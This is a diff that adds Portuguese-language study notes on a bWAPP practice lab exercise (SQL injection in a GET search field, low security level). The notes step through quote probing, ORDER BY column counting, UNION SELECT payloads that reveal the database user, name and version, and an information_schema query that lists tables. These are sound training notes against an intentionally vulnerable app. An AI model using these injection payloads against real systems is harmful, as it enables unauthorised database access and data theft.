@@ -1,0 +1,58 @@
+// Vamos abrir nossa área de testes e entrar em bWAPP
+
+Nível de Segurança Low
+
+Exercício: SQL Injection [GET/Search]
+
+Vamos adicionar caracteres no campo search para ver o comportamento da aplicação em relação a palavras.
+[Upercase | Lowercase | ETC..]
+
+Vamos testar o campo colocando caracteres especiais.
+' --> Deu erro: SQL Syntax
+
+SELECT * FROM filmes WHERE titulo LIKE '%'.$titulo.'%'
+------------------------------------------------------ 
+
+Injeção 1: '
+Query: SELECT * FROM filmes WHERE titulo LIKE '%'%'
+Ex: '
+----------------------------------------------------
+
+Injeção 2: '#
+Query: SELECT * FROM filmes WHERE titulo LIKE '#'
+
+
+
+______________________________________
+// Ler Informações do Banco de Dados \\
+----------------------------------------
+
+
+
+Injeção 1: ' ORDER BY 1#
+Query: SELECT * FROM filmes WHERE titulo LIKE '%' ORDER BY 1#%'
+
+Injeção: ' ORDER BY 2#
+Injeção: ' ORDER BY 3#
+Injeção: ' ORDER BY 4#
+Injeção: ' ORDER BY 5#
+
+--> ' ORDER BY 7#
+----------------------------------------------------
+
+Injeção 2: 'UNION SELECT#
+Query: SELECT * FROM filmes WHERE titulo LIKE '%".$titulo."%'
+--> ' UNION SELECT 1,2,3,4,5,6,7#
+
+Resposta: 2  |  3  |  5  |  4  |
+
+Buscando dados: ' union select 1,user(),database(),version(),5,6,7#
+Resposta: teste@localhost | bWAPP | 5.0.0-0ubuntu0.19.01.3
+
+
+
+// Listar Tabelas Dos Bancos de Dados \\
+----------------------------------------
+
+Injeção 1: ' UNION SELECT 1, table_name, table_schema,4,5,6,7 FROM information_schema.tables#
+Query: SELECT * FROM filmes WHERE titulo LIKE '%".$titulo."%'
